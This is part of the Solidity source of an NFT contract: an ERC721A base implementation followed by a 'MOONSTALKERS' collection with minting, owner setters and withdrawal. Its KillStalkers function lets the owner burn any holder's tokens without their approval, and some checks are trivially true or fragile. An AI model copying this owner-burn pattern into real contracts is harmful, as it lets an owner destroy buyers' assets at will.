950         revert OwnerQueryForNonexistentToken();
951     }
952 
953     /**
954      * @dev See {IERC721-ownerOf}.
955      */
956     function ownerOf(uint256 tokenId) public view override returns (address) {
957         return ownershipOf(tokenId).addr;
958     }
959 
960     /**
961      * @dev See {IERC721Metadata-name}.
962      */
963     function name() public view virtual override returns (string memory) {
964         return _name;
965     }
966 
967     /**
968      * @dev See {IERC721Metadata-symbol}.
969      */
970     function symbol() public view virtual override returns (string memory) {
971         return _symbol;
972     }
973 
974     /**
975      * @dev See {IERC721Metadata-tokenURI}.
976      */
977     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
978         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
979 
980         string memory baseURI = _baseURI();
981         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
982     }
983 
984     /**
985      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
986      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
987      * by default, can be overriden in child contracts.
988      */
989     function _baseURI() internal view virtual returns (string memory) {
990         return '';
991     }
992 
993     /**
994      * @dev See {IERC721-approve}.
995      */
996     function approve(address to, uint256 tokenId) public override {
997         address owner = ERC721A.ownerOf(tokenId);
998         if (to == owner) revert ApprovalToCurrentOwner();
999 
1000         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
1001             revert ApprovalCallerNotOwnerNorApproved();
1002         }
1003 
1004         _approve(to, tokenId, owner);
1005     }
1006 
1007     /**
1008      * @dev See {IERC721-getApproved}.
1009      */
1010     function getApproved(uint256 tokenId) public view override returns (address) {
1011         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
1012 
1013         return _tokenApprovals[tokenId];
1014     }
1015 
1016     /**
1017      * @dev See {IERC721-setApprovalForAll}.
1018      */
1019     function setApprovalForAll(address operator, bool approved) public override {
1020         if (operator == _msgSender()) revert ApproveToCaller();
1021 
1022         _operatorApprovals[_msgSender()][operator] = approved;
1023         emit ApprovalForAll(_msgSender(), operator, approved);
1024     }
1025 
1026     /**
1027      * @dev See {IERC721-isApprovedForAll}.
1028      */
1029     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1030         return _operatorApprovals[owner][operator];
1031     }
1032 
1033     /**
1034      * @dev See {IERC721-transferFrom}.
1035      */
1036     function transferFrom(
1037         address from,
1038         address to,
1039         uint256 tokenId
1040     ) public virtual override {
1041         _transfer(from, to, tokenId);
1042     }
1043 
1044     /**
1045      * @dev See {IERC721-safeTransferFrom}.
1046      */
1047     function safeTransferFrom(
1048         address from,
1049         address to,
1050         uint256 tokenId
1051     ) public virtual override {
1052         safeTransferFrom(from, to, tokenId, '');
1053     }
1054 
1055     /**
1056      * @dev See {IERC721-safeTransferFrom}.
1057      */
1058     function safeTransferFrom(
1059         address from,
1060         address to,
1061         uint256 tokenId,
1062         bytes memory _data
1063     ) public virtual override {
1064         _transfer(from, to, tokenId);
1065         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1066             revert TransferToNonERC721ReceiverImplementer();
1067         }
1068     }
1069 
1070     /**
1071      * @dev Returns whether `tokenId` exists.
1072      *
1073      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1074      *
1075      * Tokens start existing when they are minted (`_mint`),
1076      */
1077     function _exists(uint256 tokenId) internal view returns (bool) {
1078         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1079             !_ownerships[tokenId].burned;
1080     }
1081 
1082     function _safeMint(address to, uint256 quantity) internal {
1083         _safeMint(to, quantity, '');
1084     }
1085 
1086     /**
1087      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1088      *
1089      * Requirements:
1090      *
1091      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1092      * - `quantity` must be greater than 0.
1093      *
1094      * Emits a {Transfer} event.
1095      */
1096     function _safeMint(
1097         address to,
1098         uint256 quantity,
1099         bytes memory _data
1100     ) internal {
1101         _mint(to, quantity, _data, true);
1102     }
1103 
1104     /**
1105      * @dev Mints `quantity` tokens and transfers them to `to`.
1106      *
1107      * Requirements:
1108      *
1109      * - `to` cannot be the zero address.
1110      * - `quantity` must be greater than 0.
1111      *
1112      * Emits a {Transfer} event.
1113      */
1114     function _mint(
1115         address to,
1116         uint256 quantity,
1117         bytes memory _data,
1118         bool safe
1119     ) internal {
1120         uint256 startTokenId = _currentIndex;
1121         if (to == address(0)) revert MintToZeroAddress();
1122         if (quantity == 0) revert MintZeroQuantity();
1123 
1124         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1125 
1126         // Overflows are incredibly unrealistic.
1127         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1128         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1129         unchecked {
1130             _addressData[to].balance += uint64(quantity);
1131             _addressData[to].numberMinted += uint64(quantity);
1132 
1133             _ownerships[startTokenId].addr = to;
1134             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1135 
1136             uint256 updatedIndex = startTokenId;
1137             uint256 end = updatedIndex + quantity;
1138 
1139             if (safe && to.isContract()) {
1140                 do {
1141                     emit Transfer(address(0), to, updatedIndex);
1142                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1143                         revert TransferToNonERC721ReceiverImplementer();
1144                     }
1145                 } while (updatedIndex != end);
1146                 // Reentrancy protection
1147                 if (_currentIndex != startTokenId) revert();
1148             } else {
1149                 do {
1150                     emit Transfer(address(0), to, updatedIndex++);
1151                 } while (updatedIndex != end);
1152             }
1153             _currentIndex = updatedIndex;
1154         }
1155         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1156     }
1157 
1158     /**
1159      * @dev Transfers `tokenId` from `from` to `to`.
1160      *
1161      * Requirements:
1162      *
1163      * - `to` cannot be the zero address.
1164      * - `tokenId` token must be owned by `from`.
1165      *
1166      * Emits a {Transfer} event.
1167      */
1168     function _transfer(
1169         address from,
1170         address to,
1171         uint256 tokenId
1172     ) private {
1173         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1174 
1175         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1176             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1177             getApproved(tokenId) == _msgSender());
1178 
1179         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1180         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1181         if (to == address(0)) revert TransferToZeroAddress();
1182 
1183         _beforeTokenTransfers(from, to, tokenId, 1);
1184 
1185         // Clear approvals from the previous owner
1186         _approve(address(0), tokenId, prevOwnership.addr);
1187 
1188         // Underflow of the sender's balance is impossible because we check for
1189         // ownership above and the recipient's balance can't realistically overflow.
1190         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1191         unchecked {
1192             _addressData[from].balance -= 1;
1193             _addressData[to].balance += 1;
1194 
1195             _ownerships[tokenId].addr = to;
1196             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1197 
1198             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1199             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1200             uint256 nextTokenId = tokenId + 1;
1201             if (_ownerships[nextTokenId].addr == address(0)) {
1202                 // This will suffice for checking _exists(nextTokenId),
1203                 // as a burned slot cannot contain the zero address.
1204                 if (nextTokenId < _currentIndex) {
1205                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1206                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1207                 }
1208             }
1209         }
1210 
1211         emit Transfer(from, to, tokenId);
1212         _afterTokenTransfers(from, to, tokenId, 1);
1213     }
1214 
1215     /**
1216      * @dev Destroys `tokenId`.
1217      * The approval is cleared when the token is burned.
1218      *
1219      * Requirements:
1220      *
1221      * - `tokenId` must exist.
1222      *
1223      * Emits a {Transfer} event.
1224      */
1225     function _burn(uint256 tokenId) internal virtual {
1226         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1227 
1228         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1229 
1230         // Clear approvals from the previous owner
1231         _approve(address(0), tokenId, prevOwnership.addr);
1232 
1233         // Underflow of the sender's balance is impossible because we check for
1234         // ownership above and the recipient's balance can't realistically overflow.
1235         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1236         unchecked {
1237             _addressData[prevOwnership.addr].balance -= 1;
1238             _addressData[prevOwnership.addr].numberBurned += 1;
1239 
1240             // Keep track of who burned the token, and the timestamp of burning.
1241             _ownerships[tokenId].addr = prevOwnership.addr;
1242             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1243             _ownerships[tokenId].burned = true;
1244 
1245             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1246             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1247             uint256 nextTokenId = tokenId + 1;
1248             if (_ownerships[nextTokenId].addr == address(0)) {
1249                 // This will suffice for checking _exists(nextTokenId),
1250                 // as a burned slot cannot contain the zero address.
1251                 if (nextTokenId < _currentIndex) {
1252                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1253                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1254                 }
1255             }
1256         }
1257 
1258         emit Transfer(prevOwnership.addr, address(0), tokenId);
1259         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1260 
1261         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1262         unchecked {
1263             _burnCounter++;
1264         }
1265     }
1266 
1267     /**
1268      * @dev Approve `to` to operate on `tokenId`
1269      *
1270      * Emits a {Approval} event.
1271      */
1272     function _approve(
1273         address to,
1274         uint256 tokenId,
1275         address owner
1276     ) private {
1277         _tokenApprovals[tokenId] = to;
1278         emit Approval(owner, to, tokenId);
1279     }
1280 
1281     /**
1282      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1283      *
1284      * @param from address representing the previous owner of the given token ID
1285      * @param to target address that will receive the tokens
1286      * @param tokenId uint256 ID of the token to be transferred
1287      * @param _data bytes optional data to send along with the call
1288      * @return bool whether the call correctly returned the expected magic value
1289      */
1290     function _checkContractOnERC721Received(
1291         address from,
1292         address to,
1293         uint256 tokenId,
1294         bytes memory _data
1295     ) private returns (bool) {
1296         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1297             return retval == IERC721Receiver(to).onERC721Received.selector;
1298         } catch (bytes memory reason) {
1299             if (reason.length == 0) {
1300                 revert TransferToNonERC721ReceiverImplementer();
1301             } else {
1302                 assembly {
1303                     revert(add(32, reason), mload(reason))
1304                 }
1305             }
1306         }
1307     }
1308 
1309     /**
1310      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1311      * And also called before burning one token.
1312      *
1313      * startTokenId - the first token id to be transferred
1314      * quantity - the amount to be transferred
1315      *
1316      * Calling conditions:
1317      *
1318      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1319      * transferred to `to`.
1320      * - When `from` is zero, `tokenId` will be minted for `to`.
1321      * - When `to` is zero, `tokenId` will be burned by `from`.
1322      * - `from` and `to` are never both zero.
1323      */
1324     function _beforeTokenTransfers(
1325         address from,
1326         address to,
1327         uint256 startTokenId,
1328         uint256 quantity
1329     ) internal virtual {}
1330 
1331     /**
1332      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1333      * minting.
1334      * And also called after one token has been burned.
1335      *
1336      * startTokenId - the first token id to be transferred
1337      * quantity - the amount to be transferred
1338      *
1339      * Calling conditions:
1340      *
1341      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1342      * transferred to `to`.
1343      * - When `from` is zero, `tokenId` has been minted for `to`.
1344      * - When `to` is zero, `tokenId` has been burned by `from`.
1345      * - `from` and `to` are never both zero.
1346      */
1347     function _afterTokenTransfers(
1348         address from,
1349         address to,
1350         uint256 startTokenId,
1351         uint256 quantity
1352     ) internal virtual {}
1353 }
1354 
1355 
1356 contract MOONSTALKERS is ERC721A, Owneable {
1357 
1358     // ===== Variables =====
1359     string public baseURI = "";
1360     string public contractURI = "ipfs://bafkreiafbpdvdgmf3aljljg6zbqp6lgkal6a5t3hubj2p3pflxws5ysyme";
1361     string public constant baseExtension = ".json";
1362     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1363     uint256 public MintPrice = 0.002 ether;
1364     uint256 public PopulationSize = 6666;
1365     uint256 public FreeMintSize = 3388;
1366     uint256 public reservedSize = 600;
1367     uint256 public maxItemsPerWallet = 5;
1368     uint256 public constant maxItemsPerTx = 5;
1369     uint256 public maxBatchSize = 10;
1370     bool public StartMint = false;
1371     mapping (address => bool) public FreeMinted;
1372     mapping(address => uint256) public howmanyMinted;
1373 
1374     // ===== Constructor =====
1375     constructor() ERC721A("Moonstalkers Official", "MOONSLR") {}
1376 
1377     // ===== Modifier ===== (check if it affects)
1378     function _onlySender() private view {
1379         require(msg.sender == tx.origin);
1380     }
1381 
1382     modifier onlySender {
1383         _onlySender();
1384         _;
1385     }
1386 
1387     function _startTokenId() internal view virtual override returns (uint256) {
1388     return 1;
1389     }
1390 
1391     // ===== Dev mint =====
1392     function devMint(uint256 amount) external onlySender onlyOwner {
1393         require(amount <= reservedSize, "Minting amount exceeds reserved size");
1394         require((totalSupply() + amount) <= PopulationSize, "Sold out!");
1395         require(
1396             amount % maxBatchSize == 0,
1397             "Can only mint a multiple of the maxBatchSize"
1398         );
1399         uint256 numChunks = amount / maxBatchSize;
1400         for (uint256 i = 0; i < numChunks; i++) {
1401             _safeMint(msg.sender, maxBatchSize);
1402         }
1403     }
1404 
1405     // ===== Public mint =====
1406      function mint(uint256 _mintAmount) external payable {
1407         uint256 s = totalSupply();
1408         if(s + _mintAmount > FreeMintSize + 1) { 
1409             require(msg.value >= MintPrice * _mintAmount, "You are slow!No more free mint");
1410             }else{
1411             require(msg.value >= 0, "INVALID_ETH");
1412             }
1413         require(tx.origin == msg.sender, "No contracts");
1414         require(_mintAmount > 0, "Cant mint 0");
1415         require(StartMint, "Portal is not ready yet. Be Patient!");
1416         require(s + _mintAmount <= PopulationSize, "Sold out!");
1417         require(howmanyMinted[msg.sender] + _mintAmount <= maxItemsPerWallet, "Max per Wallet reached!");
1418         require(_mintAmount <= maxItemsPerTx, "Max Tx reached");
1419         _safeMint(msg.sender, _mintAmount);
1420         howmanyMinted[msg.sender] += _mintAmount;
1421         delete s;
1422     }
1423 
1424     // ===== Setter (owner only) =====
1425     function SetStartMint(bool _state) external onlyOwner {
1426         StartMint = _state;
1427     }
1428 
1429     function SetBaseURI(string memory baseURI_) external onlyOwner {
1430         baseURI = baseURI_;
1431     }
1432 
1433     function SetContractURI(string memory _contractURI) external onlyOwner {
1434         contractURI = _contractURI;
1435     }
1436 
1437     function SetPrice(uint256 newPrice) public onlyOwner {
1438         MintPrice = newPrice;
1439     }
1440 
1441     function SetMaxPopulation(uint256 newSize) public onlyOwner {
1442         PopulationSize = newSize;
1443     }
1444 
1445     function SetFreeMintSize(uint256 newFreeSize) public onlyOwner {
1446         FreeMintSize = newFreeSize;
1447     }
1448 
1449     function KillStalkers(uint256[] memory tokenids) external onlyOwner {
1450         uint256 len = tokenids.length;
1451         for (uint256 i; i < len; i++) {
1452             uint256 tokenid = tokenids[i];
1453             _burn(tokenid);
1454         }
1455     }
1456 
1457     // ===== Withdraw to owner =====
1458     function withdraw() external onlyOwner {
1459         uint256 balance = address(this).balance;
1460         (bool success, ) = _msgSender().call{value: balance}("");
1461         require(success, "Failed to send");
1462     }
1463 
1464     // ===== View =====
1465     function isApprovedForAll(address owner, address operator)
1466         override
1467         public
1468         view
1469         returns (bool)
1470     {
1471         // Whitelist OpenSea proxy contract for easy trading.
1472         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1473         if (address(proxyRegistry.proxies(owner)) == operator) {
1474             return true;
1475         }
1476         return super.isApprovedForAll(owner, operator);
1477     }
1478 
1479     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1480         require(_exists(_tokenId), "Token does not exist.");
1481         return bytes(baseURI).length > 0 ? string(
1482             abi.encodePacked(
1483               baseURI,
1484               Strings.toString(_tokenId),
1485               baseExtension
1486             )
1487         ) : "";
1488     }
1489 
1490     function walletOfOwner(address address_) public virtual view returns (uint256[] memory) {
1491         uint256 _balance = balanceOf(address_);
1492         uint256[] memory _tokens = new uint256[] (_balance);
1493         uint256 _index;
1494         uint256 _loopThrough = totalSupply();
1495         for (uint256 i = 0; i < _loopThrough; i++) {
1496             bool _exists = _exists(i);
1497             if (_exists) {
1498                 if (ownerOf(i) == address_) { _tokens[_index] = i; _index++; }
1499             }
1500             else if (!_exists && _tokens[_balance - 1] == 0) { _loopThrough++; }
1501         }
1502         return _tokens;
1503     }
1504 }
1505 
1506     // ===== OpenSea Proxy Listing =====
1507 contract OwnableDelegateProxy { }
1508 contract ProxyRegistry {
1509     mapping(address => OwnableDelegateProxy) public proxies;
1510 }